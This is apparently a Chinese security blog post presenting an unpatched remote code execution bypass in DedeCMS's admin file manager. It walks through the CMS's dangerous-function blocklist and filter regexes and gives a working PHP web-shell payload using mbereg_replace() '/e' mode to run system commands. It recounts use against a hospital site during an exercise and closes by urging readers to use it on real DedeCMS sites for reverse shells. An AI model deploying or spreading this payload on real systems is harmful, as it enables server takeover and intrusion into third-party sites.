#  【审计0day】Dedecms最新版本RCE   
 实战安全研究   2024-06-09 10:00  
  
**前言**  
  
**前段时间朋友参加市级攻防演练正好遇到了一个医院dedecms二开的新闻站点，通过旁站sql注入成功进入dedecms后台，一看是最新版的dedecms朋友摇了摇头觉得无从下手，我直接掏出个人审计0day出来助力梦想。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EpYE1OJT0RczVnMZRnrvqic30ibSEfxricLfrwqCBlq3wzJHibBgia0ESPLg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4E1deYn1mOjSibvcBaRBloLiaIK1aO5UDGJoedypzgU72vfELTqZ9QnrGQ/640?wx_fmt=png&from=appmsg "")  
  
**以下实例讲解仅作技术分享，无教唆指导任何网络犯罪行为，因为传播利用本文所提供信息造成的任何结果，均有使用者本人承担责任，公众号作者不为此承担任何责任！**  
  
**漏洞概述**  
  
**漏洞概述：DedeCms文件管理处存在命令执行漏洞，攻击者可以通过该漏洞使得服务器执行危险指令。******  
  
**公司官网:****https://www.dedecms.com/******  
  
**源码归属:****https://www.dedecms.com/download**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EfqVy8rTBz7KePayogF5yZZJy13VicbuYyOEraaGcXbqpxCibKIQAiaICw/640?wx_fmt=png&from=appmsg "")  
  
**代码审计过程：******  
  
**来到项目文件/dede/file_manage_control.php处，可以发现这里有个全局过滤函数列表。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EJYbR70TRE0lnAaTIydvSCYuS5Iq8Jpicbf1dQfRdSichXFTyYsich6UYA/640?wx_fmt=png&from=appmsg "")  
  
**文件管理器并未限制.php的文件上传，但是对许多危险函数进行了黑名单限制，使用全局变量$cfg_disable_funs进行全局加黑，匹配到相关恶意代码就直接终止并且弹出警告信息："当前页面存在恶意代码"。******  
```
1.global $cfg_disable_funs;
2.$cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';
3.$cfg_disable_funs = $cfg_disable_funs.',[$]GLOBALS,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,require,create_function,array_map,call_user_func,call_user_func_array,array_filert,getallheaders';
4.foreach (explode(",", $cfg_disable_funs) as $value) {
5.    $value = str_replace(" ", "", $value);
6.    if(!empty($value) && preg_match("#[^a-z]+['\"]*{$value}['\"]*[\s]*[([{']#i", " {$str}") == TRUE) {
7.        $str = dede_htmlspecialchars($str);
8.        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
9.    }
10.}
11.
12.if(preg_match("#^[\s\S]+<\?(php|=)?[\s]+#i", " {$str}") == TRUE) {
13.    if(preg_match("#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU", " {$str}") == TRUE) {
14.        $str = dede_htmlspecialchars($str);
15.        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
16.    }
17.    if(preg_match("#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU", " {$str}") == TRUE) {
18.        $str = dede_htmlspecialchars($str);
19.        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
20.    }
21.    if(preg_match("#[`][\s\S]*[`]#i", " {$str}") == TRUE) {
22.        $str = dede_htmlspecialchars($str);
23.        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
24.    }
25.}
```  
  
**我们接下来一个一个正则来进行分析，查看是否有其他黑名单函数未囊括在其中，接下来进入第一个正则。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EwK7PVPq5WunyoFicK6YD3zEicia3Xn6ZFEqsBOrib7JBmCow43NfbQTibiag/640?wx_fmt=png&from=appmsg "")  
```
1.$str = preg_replace("#(/\*)[\s\S]*(\*/)#i", '', $str);
2.
3.global $cfg_disable_funs;
4.$cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';
5.$cfg_disable_funs = $cfg_disable_funs.',[$]GLOBALS,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,require,create_function,array_map,call_user_func,call_user_func_array,array_filert,getallheaders';
6.foreach (explode(",", $cfg_disable_funs) as $value) {
7.    $value = str_replace(" ", "", $value);
8.    if(!empty($value) && preg_match("#[^a-z]+['\"]*{$value}['\"]*[\s]*[([{']#i", " {$str}") == TRUE) {
9.        $str = dede_htmlspecialchars($str);
10.        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
11.    }
12.}
```  
  
**正则表达式将字符串中的注释部分去除掉****，****然后定义了一个变量 $cfg_disable_funs，用来存储禁用的函数列表，如果该变量未定义，则默认设置一些常见的危险函数。接着****进入****foreach 循环遍历 $cfg_disable_funs 中的函数列表，将每个函数名去除空格，并使用正则表达式匹配是否在 $str 中存在该函数调用。如果匹配成功，则将 $str 使用 dede_htmlspecialchars 处理****不解析****，并输出提示信息表示存在恶意代码，然后终止程序运行。******  
  
**第一段正则匹配中禁用的函数有****phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace，[$]GLOBALS,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,require,create_function,array_map,call_user_func,call_user_func_array,array_filert,getallheaders。****这里我们不能用常规思路，我们应该想想还能用哪些偏门函数。get_defined_functions()并未在上述黑名单中，所以这里先想到的是get_defined_functions()绕过，思路如下: 通过get_defined_functions()索引相关系统函数，再去动态调用其函数传参命令进行RCE，下面是我的本地实验过程。**  
```
1.<?php
2.$functions = get_defined_functions()["internal"];
3.$position = array_search("system", $functions);
4.
5.if ($position !== false) {
6.    echo "success: " . $position."\n";
7.} else {
8.    echo "fail";
9.}
```  
  
**首先写了个索引程序，尝试索引system所在的系统定义函数数组位置，并回返他的位置参数，我这里索引出来的位置是383。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4E4BKx7fLItYZBZMzY5VE0Q9ft2cEhGiaUvAaH4ibt2EnEu0aybia2bPTJA/640?wx_fmt=png&from=appmsg "")  
  
**接着去进行动态函数调用并且传参whoami，成功执行。******  
```
1.$a=(get_defined_functions()["internal"][383]);
2.$a('whoami');
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EDNOXtGhTmVtRBiag4KYJZnWiaDB89BJ2ic97wLMUrPhLUspW2icPgazmcQ/640?wx_fmt=png&from=appmsg "")  
  
**接着我们去文件管理器新建文件至系统进行尝试。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EVdu7Rt6LXtaTwP6nZfDRic5nYSiag5LQ7R9rGRbicYfsnBhZ1u90PwtwA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EZY2ZkOYoXbXPesjMGPG2wZmJeqQD5rduscibIgItib2z2348fOWRy6yA/640?wx_fmt=png&from=appmsg "")  
  
**服务器保存成功且回返其在系统函数数组中的索引。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4Emz8fZkZKibBzia5vNTDUVIovqPNoO6t5hyEFlnN4gJ67Mr0AdwicSvpTQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4E9d3xCbDgicA07hUBZVkE0fb4VB0F0FXXBhhKXVacf76U9mbEXdTpbQg/640?wx_fmt=png&from=appmsg "")  
  
**接着我们知道system函数的索引位置后可以进行动态调用，此时系统对文件进行了拦截。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EYQvTS7jsVjubZZgdQ96z1vZAbtOWwcxVmEgwOOxWKBIHCKNJ0Gr1Lw/640?wx_fmt=png&from=appmsg "")  
  
**此时我们看一下后面的正则对我们的内容进行了哪些过滤。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4ESyfiaFa7bxqf4b7a5PEp0XUAb7XC8JZpTzUSibujrIibNHPTibrBRj138Q/640?wx_fmt=png&from=appmsg "")  
```
1.if(preg_match("#^[\s\S]+<\?(php|=)?[\s]+#i", " {$str}") == TRUE) {
2.    if(preg_match("#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU", " {$str}") == TRUE) {
3.        $str = dede_htmlspecialchars($str);
4.        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
5.    }
6.    if(preg_match("#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU", " {$str}") == TRUE) {
7.        $str = dede_htmlspecialchars($str);
8.        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
9.    }
10.    if(preg_match("#[`][\s\S]*[`]#i", " {$str}") == TRUE) {
11.        $str = dede_htmlspecialchars($str);
12.        die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$str}</pre>");
13.    }
14.}
```  
  
**1.最外层的 if 语句使用正则表达式检测字符串中是否以 "<?php"、"<?=" 或 "<? " 开头，这步主要是校验是否是php文件，如果是php文件格式则进入此if代码逻辑块，并进行一系列判断过滤处理，根据不同的正则匹配进入相应的if逻辑校验段。******  
  
**2.内层第一****个 if 语句使用正则表达式检测字符串中是否包含类似于 "****GET()****、"variable()" 的函数调用格式，****主要是拦截自定义函数之类的****。******  
  
**3.内层****第****二****个 if 语句使用正则表达式检测字符串中是否包含类似于 "@$variable()"****规避函数动态调用****。******  
  
**4.内层第三****个 if 语句使用正则表达式检测字符串中是否包含反引号 "`" 包裹的内容****并作处理。******  
  
**此时可以得出结论：动态函数调用这条路走不通，意味着数组拼接、${}二次解析，系统函数索引调用等凡是利用动态函数调用执行命令的bypass方式都不行，正则匹配****”/****e****”****模式又被禁用。但此时仍存在一个bypass绕过点，mbereg_replace()绕过，这里的mbereg_replace()也支持正则"/e"代码执行模式。**  
  
**具体的介绍在这里******  
  
**https://www.php.net/manual/zh/function.mb-eregi-replace.php**  
****  
  
**这里的思路就是利用字符拼接+mbereg_replace()的/e模式进行bypass，我们看一下以下这段代码执行结果。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4E1QoX7HvAWGGBexticlibUQccxRt45IA9apSFIDRDeQibqw0EvJNInSNTQ/640?wx_fmt=png&from=appmsg "")  
  
**这里就是采用的mbereg_replace()开启/e模式，拼接的$a.$b字符串为system(****‘****whoami****’****)，这里采用字符串而不直接调用system()函数是因为前面system()函数已经加入黑名单了，当我们$a.$b拼接时为一个新的字符串。本质是就是mbereg_replace()的/e模式执行了system函数，并传参whoami进行执行，我们尝试上传bypass。******  
  
**Payload如下:******  
```
<?php
$a = 'system';
$b = '(whoami)';
echo mbereg_replace('.*', '\0', $a.$b, 'mer');
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EmQyYIicgy1pBwGaoTj0ZPctstP6Ydas6XS0ASn19UL4Hp4S7okQpoaw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4E9vnoR6dEpZkxJp2Acia3mrMxQYCYWQAia8a6iagrYUcSVQ9BnfQRqUEqw/640?wx_fmt=png&from=appmsg "")  
  
**访问新建的文件http://192.168.111.130/shell.php，这里返回两次www的用户名是因为我使用了echo打印。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4EeeR8rTUWjII7Xh5nV7MUicKiaq27UP78WDgUd4Z3ZJiaTFhkMtmU3j5xA/640?wx_fmt=png&from=appmsg "")  
  
**为了更直观，我们打印ip地址信息。******  
```
1.<?php
2.$a = 'system';
3.$b = '(ifconfig)';
4.echo mbereg_replace('.*', '\0', $a.$b, 'mer');
```  
  
**接着继续访问http://192.168.111.130/shell1.php，成功解析执行。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4El0Y5xgWVB21XHNibfEK2pXcPelrRYLz0eU8kkpnia0vOgAuu5rZHC0BQ/640?wx_fmt=png&from=appmsg "")  
  
**对比查看，命令执行结果一致。******  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VSMAZ84a1FAjuawKIMAUUxOVes7Jmz4E00FAxR9xkIC03AtAjN0RB6BlsE2VhD7roIPQ6zCvq9HtsuiaE973MoA/640?wx_fmt=png&from=appmsg "")  
  
**师傅们后续遇到dedecms二开的新闻站点可以利用该漏洞，命令执行反弹shell上马完全是可以的！欢迎各位师傅们加入团队公开群沟通交流，加VX拉师傅们入群: f18089848863。**  
  
